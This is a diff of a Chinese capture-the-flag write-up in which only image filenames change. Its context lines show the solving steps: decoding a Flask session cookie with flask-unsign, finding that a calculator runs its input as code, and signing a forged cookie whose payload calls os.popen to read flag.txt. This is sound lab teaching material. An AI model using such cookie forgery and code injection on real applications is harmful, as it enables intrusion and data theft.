@@ -15,7 +15,7 @@
 
 返回包会设置新的cookie
 
-![](<../../.gitbook/assets/image (24).png>)
+![](<../../.gitbook/assets/image (24) (1).png>)
 
 解密cookie
 
@@ -28,7 +28,7 @@ flask-unsign.exe --decode --cookie .eJyrVsrILC7JL6pUsoquVkrOT0lVslKyVNBSsFSq1SEo
 
 计算器的功能那就输入`1/0`主动构造错误输入
 
-![](<../../.gitbook/assets/image (22).png>)
+![](<../../.gitbook/assets/image (22) (1).png>)
 
 发现它是把输入直接当代码处理的，这里可以fuzz一下看看哪些字符串没过滤
 
@@ -50,4 +50,4 @@ flask-unsign.exe --secret "cded826a1e89925035cc05f0907855f7" --sign --cookie "{'
 
 结果`eyJoaXN0b3J5IjpbeyJjb2RlIjoiX19pbXBvcnRfXyhcIm9zXCIpLnBvcGVuKFwiY2F0IGZsYWcudHh0XCIpLnJlYWQoKSJ9XX0.YmpyRw.x1LGNmBA3XHPATpHZDhGadZOoNA`
 
-![](<../../.gitbook/assets/image (34).png>)
+![](<../../.gitbook/assets/image (34) (1).png>)
